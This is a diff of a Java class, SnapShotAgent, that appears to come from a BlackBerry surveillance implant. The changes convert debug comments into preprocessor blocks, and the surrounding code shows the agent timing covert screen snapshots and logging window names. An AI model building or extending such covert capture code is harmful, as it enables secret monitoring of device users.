@@ -1,3 +1,4 @@
+//#preprocess
 /* *************************************************
  * Copyright (c) 2010 - 2010
  * HT srl,   All rights reserved.
@@ -32,8 +33,9 @@ import blackberry.utils.WChar;
  * @author user1
  */
 public final class SnapShotAgent extends Agent {
-    // #debug
+    //#ifdef DEBUG
     static Debug debug = new Debug("SnapShotAgent", DebugLevel.NOTIFY);
+    //#endif
 
     private static final int SNAPSHOT_DEFAULT_JPEG_QUALITY = 50;
     private static final int LOG_SNAPSHOT_VERSION = 2009031201;
@@ -50,10 +52,10 @@ public final class SnapShotAgent extends Agent {
      */
     public SnapShotAgent(final boolean agentStatus) {
         super(Agent.AGENT_SNAPSHOT, agentStatus, true, "SnapShotAgent");
-        // #ifdef DBC
+        //#ifdef DBC
         Check.asserts(Log.convertTypeLog(agentId) == LogType.SNAPSHOT,
                 "Wrong Conversion");
-        // #endif
+        //#endif
     }
 
     /**
@@ -76,18 +78,22 @@ public final class SnapShotAgent extends Agent {
      */
     public void actualRun() {
 
-        // #debug info
+        //#ifdef DEBUG_INFO
         debug.info("Taking snapshot");
 
+        //#endif
+
         if (DeviceInfo.isInHolster()) {
-            // #debug info
+            //#ifdef DEBUG_INFO
             debug.info("In Holster, skipping snapshot");
+            //#endif
             return;
         }
 
         if (!Backlight.isEnabled()) {
-            // #debug info
+            //#ifdef DEBUG_INFO
             debug.info("No backlight, skipping snapshot");
+            //#endif
             return;
         }
 
@@ -113,9 +119,9 @@ public final class SnapShotAgent extends Agent {
          * file.write(plain);
          */
 
-        // #ifdef DBC
+        //#ifdef DBC
         Check.requires(log != null, "Null log");
-        // #endif
+        //#endif
 
         synchronized (log) {
             log.createLog(getAdditionalData());
@@ -123,8 +129,10 @@ public final class SnapShotAgent extends Agent {
             log.close();
         }
 
-        // #debug debug
+        //#ifdef DEBUG_TRACE
         debug.trace("finished run");
+
+        //#endif
 
     }
 
@@ -146,14 +154,16 @@ public final class SnapShotAgent extends Agent {
         windowsName = WChar.getBytes(window);
         databuffer.write(windowsName);
 
-        // #ifdef DBC
+        //#ifdef DBC
         Check.asserts(windowsName.length == wlen, "Wrong windows name");
         Check.ensures(additionalData.length == tlen,
                 "Wrong additional data name");
-        // #endif
+        //#endif
 
-        // #debug debug
+        //#ifdef DEBUG_TRACE
         debug.trace("Additional data len: " + additionalData.length);
+
+        //#endif
 
         return additionalData;
     }
@@ -163,9 +173,9 @@ public final class SnapShotAgent extends Agent {
      * @see blackberry.agent.Agent#parse(byte[])
      */
     protected boolean parse(final byte[] confParameters) {
-        // #ifdef DBC
+        //#ifdef DBC
         Check.asserts(confParameters != null, "Null confParameters");
-        // #endif
+        //#endif
 
         final DataBuffer databuffer = new DataBuffer(confParameters, 0,
                 confParameters.length, false);
@@ -180,20 +190,24 @@ public final class SnapShotAgent extends Agent {
 
             value = databuffer.readInt();
             onNewWindow = (value == 1);
-            // #debug debug
+            //#ifdef DEBUG_TRACE
             debug.trace("onNewWindow: " + onNewWindow);
+            //#endif
 
         } catch (final EOFException e) {
-            // #debug
+            //#ifdef DEBUG
             debug.error("params FAILED");
+            //#endif
             return false;
         }
 
         setPeriod(timerMillis);
         setDelay(timerMillis);
 
-        //#debug info
+        //#ifdef DEBUG_INFO
         debug.info("timer: " + timerMillis);
+
+        //#endif
 
         return true;
     }
